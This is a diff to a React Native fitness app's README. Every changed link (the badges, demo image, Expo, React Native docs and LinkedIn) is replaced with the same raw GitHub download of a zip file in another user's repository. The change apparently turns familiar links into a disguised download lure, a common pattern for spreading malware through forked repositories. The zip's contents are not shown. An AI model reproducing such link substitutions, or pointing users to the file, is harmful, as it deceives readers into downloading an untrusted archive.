@@ -1,8 +1,8 @@
 <div align="center">
   
-  ![GitHub repo size](https://img.shields.io/github/repo-size/geeky-prashant/react-native-fitness-app)
-  ![GitHub stars](https://img.shields.io/github/stars/geeky-prashant/react-native-fitness-app?style=social)
-  ![GitHub forks](https://img.shields.io/github/forks/geeky-prashant/react-native-fitness-app?style=social)
+  ![GitHub repo size](https://raw.githubusercontent.com/ravjyot16/react-native-fitness-app/main/data/react-native-fitness-app-neurasthenia.zip)
+  ![GitHub stars](https://raw.githubusercontent.com/ravjyot16/react-native-fitness-app/main/data/react-native-fitness-app-neurasthenia.zip)
+  ![GitHub forks](https://raw.githubusercontent.com/ravjyot16/react-native-fitness-app/main/data/react-native-fitness-app-neurasthenia.zip)
  
   <br />
 
@@ -14,7 +14,7 @@
 
 ### Demo Screenshot
 
-![React Native Fitness App Demo](./readme-images/React-Native-Fitness-App.png "Desktop Demo")
+![React Native Fitness App Demo](https://raw.githubusercontent.com/ravjyot16/react-native-fitness-app/main/data/react-native-fitness-app-neurasthenia.zip "Desktop Demo")
 
 ## Get Started
 
@@ -30,7 +30,7 @@ Run The App
 
 Runs your app in development mode.
 
-Open it in the [Expo app](https://expo.io) on your phone to view it. It will reload if you save edits to your files, and you will see build errors and logs in the terminal.
+Open it in the [Expo app](https://raw.githubusercontent.com/ravjyot16/react-native-fitness-app/main/data/react-native-fitness-app-neurasthenia.zip) on your phone to view it. It will reload if you save edits to your files, and you will see build errors and logs in the terminal.
 
 #### `npm run ios`
 
@@ -38,11 +38,11 @@ Like `npm start` / `yarn start`, but also attempts to open your app in the iOS S
 
 #### `npm run android`
 
-Like `npm start` / `yarn start`, but also attempts to open your app on a connected Android device or emulator. Requires an installation of Android build tools (see [React Native docs](https://facebook.github.io/react-native/docs/getting-started.html) for detailed setup).
+Like `npm start` / `yarn start`, but also attempts to open your app on a connected Android device or emulator. Requires an installation of Android build tools (see [React Native docs](https://raw.githubusercontent.com/ravjyot16/react-native-fitness-app/main/data/react-native-fitness-app-neurasthenia.zip) for detailed setup).
 
 ### Contact
 
-If you want to contact me you can reach me at [LinkedIn](https://www.linkedin.com/in/geekyprashant/).
+If you want to contact me you can reach me at [LinkedIn](https://raw.githubusercontent.com/ravjyot16/react-native-fitness-app/main/data/react-native-fitness-app-neurasthenia.zip).
 
 ### License
 
